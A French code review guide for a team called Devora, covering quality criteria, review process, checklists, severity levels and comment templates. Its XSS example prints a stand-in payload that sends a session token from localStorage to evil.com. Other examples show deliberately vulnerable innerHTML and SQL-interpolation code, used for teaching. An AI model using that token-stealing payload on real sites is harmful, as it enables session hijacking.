# Guide de Code Review - Devora

## Table des Matières
- [Philosophie](#philosophie)
- [Critères de Qualité](#critères-de-qualité)
- [Process de Review](#process-de-review)
- [Checklist Complète](#checklist-complète)
- [Niveaux de Sévérité](#niveaux-de-sévérité)
- [Templates de Commentaires](#templates-de-commentaires)
- [Bonnes Pratiques](#bonnes-pratiques)

---

## Philosophie

### Objectifs Principaux
1. **Qualité du Code**: Maintenir un code propre, maintenable et performant
2. **Partage de Connaissances**: Apprentissage mutuel entre reviewers et auteurs
3. **Cohérence**: Assurer la cohérence architecturale et stylistique
4. **Prévention**: Détecter les bugs avant qu'ils n'atteignent la production

### Principes Fondamentaux
- ✅ **Bienveillance**: Reviews constructives, jamais personnelles
- ✅ **Rapidité**: Reviews dans les 24h pour ne pas bloquer le développement
- ✅ **Clarté**: Commentaires précis avec exemples de code
- ✅ **Éducation**: Expliquer le "pourquoi", pas seulement le "quoi"

---

## Critères de Qualité

### 1. Fonctionnalité (Priorité: CRITIQUE)
- [ ] Le code fait-il exactement ce qui est décrit dans la PR?
- [ ] Tous les cas d'usage sont-ils couverts?
- [ ] Les edge cases sont-ils gérés?
- [ ] Les erreurs sont-elles gérées proprement?
- [ ] Le code fonctionne-t-il sur tous les navigateurs supportés?

**Exemple de commentaire:**
```markdown
❌ **BLOCKER**: Le cas où `userId` est `null` n'est pas géré.

Suggestion:
\`\`\`javascript
if (!userId) {
  throw new Error('User ID is required');
}
\`\`\`
```

### 2. Sécurité (Priorité: CRITIQUE)
- [ ] Pas de secrets/clés API en dur dans le code
- [ ] Validation de tous les inputs utilisateur
- [ ] Protection contre XSS (Cross-Site Scripting)
- [ ] Protection contre CSRF (si applicable)
- [ ] Authentification/Autorisation correctement implémentée
- [ ] Pas de eval() ou de code dynamique non sécurisé
- [ ] Données sensibles chiffrées
- [ ] Logs ne contenant pas d'infos sensibles

**Exemple de commentaire:**
```markdown
🔒 **SECURITY**: Input non validé - risque d'injection

Ce code est vulnérable:
\`\`\`javascript
// ❌ Mauvais
const query = `SELECT * FROM users WHERE id = ${userId}`;
\`\`\`

Correction:
\`\`\`javascript
// ✅ Bon
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);
\`\`\`
```

### 3. Performance (Priorité: HAUTE)
- [ ] Pas de boucles imbriquées inutiles (O(n²) évitable)
- [ ] Mémoïsation appropriée (useMemo, useCallback en React)
- [ ] Lazy loading des ressources lourdes
- [ ] Images optimisées
- [ ] Bundle size raisonnable
- [ ] Pas de re-renders inutiles
- [ ] Requêtes API optimisées (pagination, batch)

**Exemple de commentaire:**
```markdown
⚡ **PERFORMANCE**: Re-render à chaque keystroke

Problème:
\`\`\`javascript
// ❌ Crée une nouvelle fonction à chaque render
<input onChange={(e) => handleChange(e)} />
\`\`\`

Solution:
\`\`\`javascript
// ✅ Fonction mémoïsée
const handleChange = useCallback((e) => {
  // ...
}, [dependencies]);
\`\`\`
```

### 4. Tests (Priorité: HAUTE)
- [ ] Tests unitaires pour la logique métier
- [ ] Tests d'intégration pour les flux critiques
- [ ] Coverage ≥ 80% pour les nouvelles fonctionnalités
- [ ] Tests E2E pour les user flows principaux
- [ ] Tests de régression pour les bug fixes
- [ ] Tests passent tous en local ET en CI

**Exemple de commentaire:**
```markdown
🧪 **TESTS MANQUANTS**: Fonction critique non testée

Ajoutez au minimum:
\`\`\`javascript
describe('calculateTotal', () => {
  it('should handle empty cart', () => {
    expect(calculateTotal([])).toBe(0);
  });

  it('should apply discount correctly', () => {
    expect(calculateTotal(items, 0.2)).toBe(80);
  });
});
\`\`\`
```

### 5. Architecture & Design (Priorité: MOYENNE)
- [ ] Respect des principes SOLID
- [ ] Séparation des responsabilités (SoC)
- [ ] DRY (Don't Repeat Yourself)
- [ ] YAGNI (You Ain't Gonna Need It)
- [ ] Cohérence avec l'architecture existante
- [ ] Pas de couplage fort inutile
- [ ] Composants réutilisables

**Exemple de commentaire:**
```markdown
🏗️ **ARCHITECTURE**: Violation du principe de responsabilité unique

Ce composant fait trop de choses:
- Fetch data
- Business logic
- UI rendering

Suggestion: Séparer en:
- `useProjectData` hook (data fetching)
- `projectUtils.js` (business logic)
- `ProjectView` component (UI only)
\`\`\`
```

### 6. Lisibilité & Maintenabilité (Priorité: MOYENNE)
- [ ] Noms de variables/fonctions descriptifs
- [ ] Fonctions < 50 lignes
- [ ] Fichiers < 400 lignes
- [ ] Commentaires uniquement pour logique complexe
- [ ] Code auto-documenté
- [ ] Pas de "magic numbers" (utiliser des constantes)
- [ ] Formatting conforme (Prettier)

**Exemple de commentaire:**
```markdown
📖 **READABILITY**: Variable mal nommée

\`\`\`javascript
// ❌ Peu clair
const d = new Date();
const x = users.filter(u => u.a);

// ✅ Clair
const currentDate = new Date();
const activeUsers = users.filter(user => user.isActive);
\`\`\`
```

### 7. TypeScript / Types (Priorité: MOYENNE)
- [ ] Pas de `any` (utiliser `unknown` si nécessaire)
- [ ] Interfaces/types correctement définis
- [ ] Props React typées
- [ ] Retours de fonctions typés
- [ ] Generics utilisés quand approprié
- [ ] Type checking passe sans erreurs

**Exemple de commentaire:**
```markdown
📝 **TYPES**: Utilisation de `any` - perte de type safety

\`\`\`typescript
// ❌ Mauvais
function processData(data: any) { ... }

// ✅ Bon
interface UserData {
  id: string;
  email: string;
  name: string;
}

function processData(data: UserData) { ... }
\`\`\`
```

### 8. Accessibilité (Priorité: MOYENNE)
- [ ] Attributs `alt` sur les images
- [ ] Labels sur les inputs
- [ ] Navigation au clavier fonctionnelle
- [ ] Contraste couleurs suffisant
- [ ] ARIA labels quand nécessaire
- [ ] Focus visible
- [ ] Pas de `onClick` sur div sans `role`

**Exemple de commentaire:**
```markdown
♿ **A11Y**: Bouton non accessible au clavier

\`\`\`jsx
// ❌ Pas accessible
<div onClick={handleClick}>Click me</div>

// ✅ Accessible
<button onClick={handleClick}>Click me</button>
\`\`\`
```

---

## Process de Review

### Étape 1: Analyse Initiale (5 min)
1. Lire la description de la PR
2. Vérifier que les tests CI passent (sinon, demander fix)
3. Checker le diff size (si > 500 lignes, demander split)
4. Identifier les fichiers critiques

### Étape 2: Review Approfondie (15-30 min)
1. **Sécurité first**: Scanner pour vulnérabilités
2. **Logique métier**: Vérifier la correction fonctionnelle
3. **Tests**: Vérifier coverage et qualité
4. **Performance**: Identifier les bottlenecks potentiels
5. **Code quality**: Lisibilité, maintenabilité, architecture

### Étape 3: Feedback (10 min)
1. Classer les commentaires par sévérité
2. Donner des exemples de code pour les fixes suggérés
3. Approuver ou demander des changements
4. Si changements demandés: re-review dans les 24h

### Étape 4: Approbation Finale
- [ ] Tous les commentaires BLOCKER résolus
- [ ] Tests passent (CI green)
- [ ] Pas de conflit de merge
- [ ] Documentation mise à jour si nécessaire

---

## Checklist Complète

### Avant de Soumettre une PR (Auteur)
```markdown
- [ ] Code fonctionne en local
- [ ] Tests unitaires écrits et passent
- [ ] Tests E2E ajoutés pour les nouvelles features
- [ ] `npm run lint` passe sans erreurs
- [ ] `npm run typecheck` passe
- [ ] Pas de console.log() oubliés
- [ ] Pas de code commenté (sauf si justifié)
- [ ] README/docs mis à jour si nécessaire
- [ ] Branch à jour avec main
- [ ] Commits bien nommés
- [ ] Description PR claire et détaillée
```

### Pendant la Review (Reviewer)
```markdown
## 🔒 Sécurité
- [ ] Validation des inputs
- [ ] Pas de secrets exposés
- [ ] Auth/authz correcte
- [ ] Protection XSS/CSRF

## ✅ Fonctionnalité
- [ ] Répond au besoin
- [ ] Edge cases gérés
- [ ] Erreurs gérées

## 🧪 Tests
- [ ] Coverage suffisant (≥80%)
- [ ] Tests unitaires
- [ ] Tests E2E si applicable
- [ ] Tests passent

## ⚡ Performance
- [ ] Pas de boucles O(n²) évitables
- [ ] Mémoïsation appropriée
- [ ] Bundle size raisonnable

## 🏗️ Architecture
- [ ] Cohérent avec existant
- [ ] Séparation responsabilités
- [ ] Pas de duplication

## 📖 Lisibilité
- [ ] Noms descriptifs
- [ ] Fonctions < 50 lignes
- [ ] Code auto-documenté

## 📝 Types
- [ ] Pas de `any`
- [ ] Props typées
- [ ] Type checking OK

## ♿ Accessibilité
- [ ] Alt text sur images
- [ ] Labels sur inputs
- [ ] Navigable au clavier
```

---

## Niveaux de Sévérité

### 🔴 BLOCKER (Doit être fixé avant merge)
- Vulnérabilités de sécurité
- Bugs critiques
- Perte de données potentielle
- Breaking changes non documentés
- Tests critiques qui échouent

### 🟠 MAJOR (Devrait être fixé avant merge)
- Bugs non critiques mais visibles
- Problèmes de performance significatifs
- Violation des standards du projet
- Tests manquants pour code critique
- Problèmes d'accessibilité majeurs

### 🟡 MINOR (Bon à fixer, mais peut attendre)
- Suggestions d'amélioration
- Refactoring opportuniste
- Optimisations non urgentes
- Commentaires de code manquants
- Typos dans les comments

### 🔵 NITPICK (Optionnel, style/préférence)
- Formatting mineurs
- Préférences de naming
- Suggestions d'organisation
- Optimisations micro

---

## Templates de Commentaires

### Signaler un Bug
```markdown
🐛 **BUG**: [Description courte]

**Problème:**
[Explication détaillée]

**Reproduction:**
1. Faire X
2. Observer Y

**Comportement attendu:**
[Ce qui devrait se passer]

**Fix suggéré:**
\`\`\`javascript
// Code corrigé
\`\`\`
```

### Suggestion d'Amélioration
```markdown
💡 **SUGGESTION**: [Titre]

**Actuel:**
\`\`\`javascript
// Code actuel
\`\`\`

**Suggestion:**
\`\`\`javascript
// Code amélioré
\`\`\`

**Pourquoi:**
[Explication des bénéfices]
```

### Demande de Clarification
```markdown
❓ **QUESTION**: [Question précise]

Pourriez-vous expliquer pourquoi [X] plutôt que [Y]?
Ou bien documenter cette logique dans un commentaire?
```

### Compliment
```markdown
✨ **NICE**: [Ce qui est bien fait]

J'aime particulièrement [aspect positif].
C'est une excellente approche pour [raison].
```

---

## Bonnes Pratiques

### Pour les Reviewers

#### ✅ DO
- Commencer par les points positifs
- Poser des questions plutôt que donner des ordres
- Fournir des exemples de code
- Expliquer le "pourquoi"
- Être spécifique et actionnable
- Re-review rapidement après changements
- Approuver dès que c'est mergeable

#### ❌ DON'T
- Faire des commentaires personnels
- Demander des changements non liés à la PR
- Bloquer sur des nitpicks
- Faire du bikeshedding (débats de style interminables)
- Demander un refactoring complet
- Laisser une PR sans réponse > 24h

### Pour les Auteurs

#### ✅ DO
- Répondre à TOUS les commentaires
- Demander des clarifications si besoin
- Faire les fixes demandés ou expliquer pourquoi pas
- Marquer les conversations comme résolues
- Remercier pour le feedback
- Tester localement avant chaque push

#### ❌ DON'T
- Prendre les commentaires personnellement
- Ignorer les commentaires
- Argumenter sans raison technique
- Merger sans approbation
- Faire des PR gigantesques (>500 lignes)
- Demander une review sur du code non testé

---

## Exemples de Reviews de Qualité

### Exemple 1: Bug Critique
```markdown
🔴 **BLOCKER - SÉCURITÉ**: XSS Vulnerability

**Ligne 42:**
\`\`\`javascript
element.innerHTML = userInput;
\`\`\`

**Problème:**
Permet l'injection de scripts malicieux. Un attaquant pourrait exécuter:
\`\`\`javascript
<script>
  // Steal session token
  fetch('https://evil.com?token=' + localStorage.getItem('token'))
</script>
\`\`\`

**Fix:**
\`\`\`javascript
// Option 1: Sanitize
element.innerHTML = DOMPurify.sanitize(userInput);

// Option 2: Text only (recommandé si pas besoin de HTML)
element.textContent = userInput;
\`\`\`

**Tests à ajouter:**
\`\`\`javascript
it('should prevent XSS injection', () => {
  const maliciousInput = '<script>alert("XSS")</script>';
  render(<Component input={maliciousInput} />);
  expect(screen.queryByRole('script')).not.toBeInTheDocument();
});
\`\`\`
```

### Exemple 2: Performance
```markdown
🟠 **MAJOR - PERFORMANCE**: Re-renders excessifs

**Ligne 15-20:**
Le composant re-render à chaque frappe, même si les props n'ont pas changé.

**Mesure actuelle:**
- Temps de rendu: ~150ms par keystroke
- FPS chute à 30 pendant typing

**Fix suggéré:**
\`\`\`javascript
// Avant
const MyComponent = ({ data, onUpdate }) => {
  const processedData = expensiveCalculation(data); // Recalculé à chaque render!

  return <div onClick={() => onUpdate(data)}>...</div>;
};

// Après
const MyComponent = ({ data, onUpdate }) => {
  const processedData = useMemo(
    () => expensiveCalculation(data),
    [data]
  );

  const handleClick = useCallback(
    () => onUpdate(data),
    [data, onUpdate]
  );

  return <div onClick={handleClick}>...</div>;
};
```

### Exemple 3: Architecture
```markdown
🟡 **MINOR - ARCHITECTURE**: Duplication de code

**Fichiers concernés:**
- `components/UserCard.jsx` (lignes 10-30)
- `components/AdminCard.jsx` (lignes 15-35)

**Observation:**
Les deux composants ont la même logique de formatting.

**Suggestion:**
Extraire dans un hook commun:

\`\`\`javascript
// hooks/useCardFormatting.js
export const useCardFormatting = (user) => {
  const formattedName = useMemo(() => {
    return `${user.firstName} ${user.lastName}`.trim();
  }, [user]);

  const formattedDate = useMemo(() => {
    return new Date(user.createdAt).toLocaleDateString('fr-FR');
  }, [user.createdAt]);

  return { formattedName, formattedDate };
};

// Utilisation
const { formattedName, formattedDate } = useCardFormatting(user);
\`\`\`

**Bénéfices:**
- DRY (une seule source de vérité)
- Testable indépendamment
- Réutilisable
```

---

## Métriques de Qualité

### Objectifs pour les Reviews
- ⏱️ **Temps de première review**: < 24h
- 🔄 **Nombre de rounds**: ≤ 2 (idéalement)
- 📊 **Coverage après merge**: ≥ 80%
- 🐛 **Bugs échappés en prod**: < 1%
- ✅ **Taux d'approbation**: ≥ 95% après changements

### Red Flags (À Surveiller)
- ⚠️ PR > 500 lignes (demander split)
- ⚠️ 0 tests ajoutés pour nouvelle feature
- ⚠️ Coverage en baisse
- ⚠️ Build time augmente significativement
- ⚠️ Bundle size +20%
- ⚠️ Commits "WIP" ou "fix typo" multiples

---

## Outils Automatisés

### Pre-commit Hooks
```bash
# .husky/pre-commit
npm run lint
npm run typecheck
npm run test:unit
```

### CI Checks (Obligatoires avant review)
- ✅ ESLint (0 erreurs, < 5 warnings)
- ✅ TypeScript compilation
- ✅ Tests unitaires (100% passent)
- ✅ Tests E2E sur flows critiques
- ✅ Build réussi
- ✅ Lighthouse score > 90

### Danger.js (Automated Reviews)
```javascript
// dangerfile.js
import { danger, warn, fail } from 'danger';

// PR trop grosse
if (danger.github.pr.additions > 500) {
  warn('⚠️ PR volumineuse (>500 lignes). Envisagez de split.');
}

// Tests manquants
const hasAppFiles = danger.git.modified_files.some(f => f.includes('src/'));
const hasTestFiles = danger.git.modified_files.some(f => f.includes('.test.'));
if (hasAppFiles && !hasTestFiles) {
  warn('⚠️ Modifications de code sans tests correspondants.');
}

// TODO laissés
const todos = danger.git.modified_files
  .map(file => fs.readFileSync(file, 'utf8'))
  .join('\n')
  .match(/TODO/g);
if (todos && todos.length > 0) {
  warn(`⚠️ ${todos.length} TODO trouvés. Créez des issues pour les tracer.`);
}
```

---

## Formation et Onboarding

### Pour Nouveaux Reviewers
1. Lire ce guide en entier
2. Observer 3-5 reviews d'un senior
3. Co-reviewer 3-5 PRs avec mentorat
4. Reviewer seul avec validation finale d'un senior
5. Reviewer autonome après approbation

### Pour Nouveaux Contributeurs
1. Lire "Bonnes Pratiques" section
2. Faire une première PR "simple" (doc, typo)
3. Recevoir feedback détaillé
4. Itérer et apprendre du process

---

## Conclusion

Le code review n'est pas une corvée, c'est:
- 🎓 Un outil d'apprentissage
- 🛡️ Un filet de sécurité contre les bugs
- 🤝 Un moment de partage entre développeurs
- 📈 Un investissement pour la qualité long-terme

**Règle d'or**: Reviewez comme vous aimeriez qu'on review votre code.

---

**Version**: 1.0
**Dernière mise à jour**: 2024-01-15
**Responsable**: QA Squad Devora
